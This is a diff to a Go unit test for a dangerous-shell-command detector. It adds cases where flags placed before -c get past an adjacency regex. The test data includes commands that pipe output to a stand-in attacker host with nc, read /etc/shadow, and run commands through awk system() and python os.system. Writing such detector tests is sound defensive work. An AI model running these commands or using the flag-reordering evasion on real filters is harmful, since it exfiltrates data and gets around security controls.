@@ -42,6 +42,13 @@ func TestContainsDangerousShellChars(t *testing.T) {
 		{"bash -lc clustered", `bash -lc 'id | nc attacker 9000'`, true},
 		{"sh -ec clustered", `sh -ec 'echo hi; cat /etc/shadow'`, true},
 		{"bash -Ec clustered", `bash -Ec 'id'`, true},
+		// Flags BEFORE the -c trigger — attacker pushes -c past the
+		// first token to bypass a regex that demanded adjacency.
+		{"bash --noprofile -lc", `bash --noprofile -lc 'id | nc attacker 9000'`, true},
+		{"bash --noprofile --norc -c", `bash --noprofile --norc -c 'whoami'`, true},
+		{"python -B -c", `python -B -c 'import os; os.system("id")'`, true},
+		{"python --quiet -c", `python --quiet -c 'print(1)'`, true},
+		{"node --max-old-space-size=256 --eval", `node --max-old-space-size=256 --eval 'process.exit(0)'`, true},
 
 		// --- awk / sed bypass -----------------------------------------
 		{"awk system()", `awk 'BEGIN{system("id")}'`, true},
